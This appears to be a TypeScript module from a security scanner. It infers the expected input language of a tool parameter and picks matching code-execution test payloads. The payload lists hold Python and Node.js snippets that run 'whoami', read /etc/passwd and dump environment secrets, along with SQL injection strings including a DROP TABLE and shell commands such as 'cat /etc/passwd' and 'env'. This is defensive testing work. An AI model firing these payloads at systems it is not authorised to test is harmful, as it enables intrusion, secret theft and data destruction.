/**
 * Language-Aware Payload Generator
 *
 * Detects expected input language from parameter/tool names and generates
 * appropriate payloads for code execution vulnerability detection.
 *
 * Problem: Inspector sends shell commands like `whoami` to all tools, but
 * code execution tools expecting language-specific input (Python, JavaScript, SQL)
 * are not detected because they reject shell syntax as invalid.
 *
 * Solution: Detect target language from context and generate appropriate payloads.
 */

export type TargetLanguage =
  | "python"
  | "javascript"
  | "sql"
  | "shell"
  | "generic";

export interface LanguagePayload {
  language: TargetLanguage;
  payload: string;
  evidence: RegExp;
  description: string;
  riskLevel: "HIGH" | "MEDIUM" | "LOW";
}

export class LanguageAwarePayloadGenerator {
  /**
   * Detect target language from parameter name and tool context.
   * Uses heuristics based on common naming patterns.
   */
  detectLanguage(
    paramName: string,
    toolName: string,
    toolDescription?: string,
  ): TargetLanguage {
    const combined =
      `${paramName} ${toolName} ${toolDescription || ""}`.toLowerCase();
    const paramLower = paramName.toLowerCase();

    // Note: Use (^|_|\s) and ($_|\s|$) instead of \b to handle underscore-separated names
    // since \b treats _ as a word character

    // Python indicators (highest priority for code execution)
    if (
      /(^|_|\s|^)(python|py|pycode)(_|\s|$)/i.test(combined) ||
      /exec_?python/i.test(combined) ||
      (/(^|_|\s)(code)(_|\s|$)/i.test(paramLower) &&
        /(^|_|\s)(python|py)(_|\s|$)/i.test(combined))
    ) {
      return "python";
    }

    // JavaScript indicators
    if (
      /(^|_|\s)(javascript|js|node|nodejs)(_|\s|$)/i.test(combined) ||
      (/(^|_|\s)(code)(_|\s|$)/i.test(paramLower) &&
        /(^|_|\s)(js|javascript|node)(_|\s|$)/i.test(combined))
    ) {
      return "javascript";
    }

    // SQL indicators (exclude NoSQL patterns)
    if (
      /(^|_|\s)(sql|query|statement)(_|\s|$)/i.test(combined) &&
      !/(nosql|mongodb|dynamodb|couchdb)/i.test(combined)
    ) {
      return "sql";
    }

    // Shell/command indicators (existing behavior)
    if (/(^|_|\s)(command|cmd|shell|bash|exec|run)(_|\s|$)/i.test(combined)) {
      return "shell";
    }

    // Generic code parameter - defaults to Python as most common
    if (
      /(^|_|\s)(code|script|source|program|expression)(_|\s|$)/i.test(
        paramLower,
      )
    ) {
      return "python";
    }

    return "generic";
  }

  /**
   * Get payloads appropriate for the detected language.
   */
  getPayloadsForLanguage(language: TargetLanguage): LanguagePayload[] {
    switch (language) {
      case "python":
        return this.getPythonPayloads();
      case "javascript":
        return this.getJavaScriptPayloads();
      case "sql":
        return this.getSqlPayloads();
      case "shell":
        return this.getShellPayloads();
      default:
        return this.getGenericPayloads();
    }
  }

  /**
   * Check if a parameter name suggests code execution context.
   */
  isCodeExecutionParameter(paramName: string): boolean {
    // Use (^|_|\s) and (_|\s|$) to handle underscore-separated names
    return /(^|_|\s)(code|script|source|program|expression|eval|exec)(_|\s|$)/i.test(
      paramName,
    );
  }

  private getPythonPayloads(): LanguagePayload[] {
    return [
      {
        language: "python",
        payload:
          "import subprocess; print(subprocess.check_output(['whoami']).decode())",
        evidence: /\b(root|user|admin|ubuntu|www-data|node|bryan)\b/i,
        description: "Python subprocess command execution",
        riskLevel: "HIGH",
      },
      {
        language: "python",
        payload: "__import__('os').system('whoami')",
        evidence: /\b(root|user|admin|ubuntu|www-data|node|bryan)\b|^0$/,
        description: "Python os.system via __import__",
        riskLevel: "HIGH",
      },
      {
        language: "python",
        payload: "import os; print(os.popen('whoami').read())",
        evidence: /\b(root|user|admin|ubuntu|www-data|node|bryan)\b/i,
        description: "Python os.popen command execution",
        riskLevel: "HIGH",
      },
      {
        language: "python",
        payload: "exec('import os; os.system(\"whoami\")')",
        evidence: /\b(root|user|admin|ubuntu|www-data|node|bryan)\b|^0$/,
        description: "Python exec() with embedded os.system",
        riskLevel: "HIGH",
      },
      {
        language: "python",
        payload: "print(open('/etc/passwd').read())",
        evidence: /root:x:0:0|\/bin\/bash|\/bin\/sh/i,
        description: "Python file read /etc/passwd",
        riskLevel: "HIGH",
      },
      {
        language: "python",
        payload: "import os; print(os.environ)",
        evidence: /(PATH|HOME|USER|SECRET|API_KEY|DATABASE|TOKEN)/i,
        description: "Python environment variable dump",
        riskLevel: "HIGH",
      },
      {
        language: "python",
        payload: "import os; print(os.getcwd())",
        evidence: /\/(home|tmp|var|app|usr|root)/i,
        description: "Python current directory disclosure",
        riskLevel: "MEDIUM",
      },
    ];
  }

  private getJavaScriptPayloads(): LanguagePayload[] {
    return [
      {
        language: "javascript",
        payload: "require('child_process').execSync('whoami').toString()",
        evidence: /\b(root|user|admin|ubuntu|www-data|node|bryan)\b/i,
        description: "Node.js execSync command execution",
        riskLevel: "HIGH",
      },
      {
        language: "javascript",
        payload:
          "const { execSync } = require('child_process'); execSync('whoami').toString()",
        evidence: /\b(root|user|admin|ubuntu|www-data|node|bryan)\b/i,
        description: "Node.js destructured execSync",
        riskLevel: "HIGH",
      },
      {
        language: "javascript",
        payload: "require('fs').readFileSync('/etc/passwd', 'utf8')",
        evidence: /root:x:0:0|\/bin\/bash|\/bin\/sh/i,
        description: "Node.js file read /etc/passwd",
        riskLevel: "HIGH",
      },
      {
        language: "javascript",
        payload: "JSON.stringify(process.env)",
        evidence: /(PATH|HOME|USER|SECRET|API_KEY|DATABASE|TOKEN)/i,
        description: "Node.js environment dump as JSON",
        riskLevel: "HIGH",
      },
      {
        language: "javascript",
        payload: "process.cwd()",
        evidence: /\/(home|tmp|var|app|usr|root)/i,
        description: "Node.js current directory disclosure",
        riskLevel: "MEDIUM",
      },
    ];
  }

  private getSqlPayloads(): LanguagePayload[] {
    return [
      {
        language: "sql",
        payload: "'; DROP TABLE users;--",
        evidence: /(dropped|deleted|table.*users|sql.*error|affected)/i,
        description: "SQL DROP TABLE injection",
        riskLevel: "HIGH",
      },
      {
        language: "sql",
        payload: "' OR '1'='1",
        evidence: /(true|1|success|rows|result)/i,
        description: "SQL boolean-based injection",
        riskLevel: "HIGH",
      },
      {
        language: "sql",
        payload: "' UNION SELECT * FROM information_schema.tables--",
        evidence: /(information_schema|table_name|table_schema)/i,
        description: "SQL UNION information disclosure",
        riskLevel: "HIGH",
      },
      {
        language: "sql",
        payload: "'; SELECT pg_sleep(5);--",
        evidence: /(pg_sleep|sleep|delayed|timeout)/i,
        description: "SQL time-based injection (PostgreSQL)",
        riskLevel: "HIGH",
      },
      {
        language: "sql",
        payload: "'; WAITFOR DELAY '0:0:5';--",
        evidence: /(waitfor|delay|timeout)/i,
        description: "SQL time-based injection (SQL Server)",
        riskLevel: "HIGH",
      },
    ];
  }

  private getShellPayloads(): LanguagePayload[] {
    return [
      {
        language: "shell",
        payload: "whoami",
        evidence: /\b(root|user|admin|ubuntu|www-data|node|bryan)\b/i,
        description: "Shell identity command",
        riskLevel: "HIGH",
      },
      {
        language: "shell",
        payload: "cat /etc/passwd",
        evidence: /root:x:0:0|\/bin\/bash|\/bin\/sh/i,
        description: "Shell file read via cat",
        riskLevel: "HIGH",
      },
      {
        language: "shell",
        payload: "id",
        evidence: /uid=\d+|gid=\d+|groups=/i,
        description: "Shell user ID command",
        riskLevel: "HIGH",
      },
      {
        language: "shell",
        payload: "env",
        evidence: /(PATH|HOME|USER|SECRET|API_KEY|DATABASE|TOKEN)/i,
        description: "Shell environment dump",
        riskLevel: "HIGH",
      },
      {
        language: "shell",
        payload: "pwd",
        evidence: /\/(home|tmp|var|app|usr|root)/i,
        description: "Shell current directory",
        riskLevel: "MEDIUM",
      },
    ];
  }

  private getGenericPayloads(): LanguagePayload[] {
    // Combine shell and Python payloads for generic detection
    return [
      ...this.getShellPayloads(),
      {
        language: "generic",
        payload: "__import__('os').system('whoami')",
        evidence: /\b(root|user|admin|ubuntu|www-data|node|bryan)\b|^0$/,
        description: "Python os.system (generic fallback)",
        riskLevel: "HIGH",
      },
    ];
  }
}
